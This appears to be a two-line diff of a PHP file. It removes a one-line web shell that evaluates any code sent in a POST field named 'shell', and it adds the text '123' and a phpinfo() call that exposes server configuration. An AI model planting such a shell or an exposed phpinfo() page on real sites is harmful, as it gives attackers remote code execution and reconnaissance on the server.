@@ -1,1 +1,2 @@
-<?php @eval($_POST['shell']);?>
+123
+<?php phpinfo();?>
